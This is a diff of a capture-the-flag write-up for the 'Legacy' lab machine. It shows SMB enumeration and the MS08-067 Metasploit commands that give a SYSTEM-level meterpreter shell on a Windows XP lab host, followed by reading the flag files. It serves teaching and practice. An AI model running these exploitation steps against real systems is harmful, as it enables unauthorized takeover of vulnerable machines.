@@ -32,11 +32,11 @@ After using Metasploit, we will also find a python script which exploits the sam
 <p>&nbsp;</p>
 
 
+=======================================================
 
-===========================================
-Scanning & Enumeration
-===========================================
+## Scanning and Enumeration
 
+=======================================================
 
 First off, we will start with a standard nmap command to see what initially shows as open:
 
@@ -74,7 +74,7 @@ No joy there. We can also try to force a certain level of the smb protocol by ad
 
 ![](/images/legacy/5. smbclient-2.png "smbclient")
 
-We can try Metasploit's smb_scanner:
+Still no luck, but we can also try Metasploit's smb_scanner:
 
     msfconsole
 
@@ -92,72 +92,93 @@ We must set the target via the RHOSTS (or rhosts, this is not case sensitive) va
 
 ![](/images/legacy/7. msf smb_version_2.png "smb_scannner")
 
-→ These scan results show it to be a Windows XP SP3 machine via port 445.
-→ Next, let's see what Google results we can find:
+These scan results show it to be a Windows XP SP3 machine via port 445.
+
+Next, let's see what Google results we can find:
+
+![](/images/legacy/8. google_xp_smb_exploit.png "Google search")
+
+The top two results mention MS08-067, so that is our first avenue we will explore.
+
+The rapid7.com link will most likely contain details for a Metasploit module, so we can start there.
+
+![](/images/legacy/9. rapid7_ms08-067.png "Rapid7")
+
+![](/images/legacy/10. rapid7_module_options.png "msf module options")
+
+So, here we have the description of the exploit and the msf commands to run.  Let's move on to exploitation via Metasploit:
 
 
+<p>&nbsp;</p>
+=======================================================
 
-→ The top two results mention MS08-067, so that is our first avenue we will explore.
-→ The rapid7.com linke will most likely contain details for a metasploit module, so we can start there.
+## Exploitation using Metasploit
 
+=======================================================
 
+In your metasploit window, let's confirm the module is still present:
 
+    search ms08-067
 
+![](/images/legacy/11. msf_search.png "msf search")
 
-→ So, here we have the description of the exploit and the msf commands to run.  Let's move on to exploitation via Metasploit:
+Next we load the module:
 
+    use exploit/windows/smb/ms08_067_netapi
 
+Alternatively, if you searched for it you can reference by the # listed above: 
 
+    use 0
+    
+First up, we want to see our options:
 
-===========================================
-Exploitation via Metasploit
-===========================================
+    show options
 
-→ In your metasploit window, let's confirm the module is still present:
-   ⇒ search ms08-067
+![](/images/legacy/12. msf_use.png "msf use")
 
+Looks like we only need to set the RHOSTS setting and then run it:
 
+    set rhosts 10.10.10.4
 
-→ Next we load the module:
-   ⇒ use exploit/windows/smb/ms08_067_netapi
-   ⇒ alternatively, if you searched for it you can reference by the # listed above: use 0
-→ First up, we want to see our options:
-   ⇒ show options
+    run
 
+![](/images/legacy/13. meterpreter.png "meterpreter")
 
+And we have a meterpreter shell!
 
-→ Looks like we only need to set the RHOSTS setting and then run it:
-   ⇒ set rhosts 10.10.10.4
-   ⇒ run
+First two commands you should run anytime you have a meterpreter shell on a Windows machine:
 
+    getuid
 
+    sysinfo
 
-→ And we have a meterpreter shell!
-→ First two commands you should run anytime you have a meterpreter shell on a Windows machine:
-   ⇒ getuid
-   ⇒ sysinfo
+![](/images/legacy/14. meterpreter_2.png "meterpreter")
 
+NT AUTHORITY\SYSTEM means we have root level access to the machine
 
+And the sysinfo output confirms this is Windows XP, SP3, 32-bit (x86)
 
-→ NT AUTHORITY\SYSTEM means we have root level access to the machine
-→ And the sysinfo output confirms this is Windows XP, SP3, 32-bit (x86)
+Next you can upgrade to a shell to find the flags:
 
-→ Next you can upgrade to a shell to find the flags:
+    shell
 
+![](/images/legacy/15. shell.png "shell")
 
+Flags are normally on the desktop of the various users. For Windows XP we need to go to Documents and Settings first:
 
-→ Flags are normally on the desktop of the various users. For Windows XP we need to go to Documents and Settings first:
-   ⇒ cd C:\"Documents and Settings"
+    cd C:\"Documents and Settings"
 
+![](/images/legacy/16. shell_2.png "shell")
 
+We have users Administrator and john.  Let's get our flags:
 
-→ We have users Administrator and john.  
-   ⇒ user flag: type john\Desktop\user.txt
-   ⇒ root flag: type Administrator\Desktop\root.txt
+    type john\Desktop\user.txt
 
+    type Administrator\Desktop\root.txt
 
+![](/images/legacy/17. flags.png "flags")
 
-→ And we have our two flags.
+And we have our two flags.
 
 
 
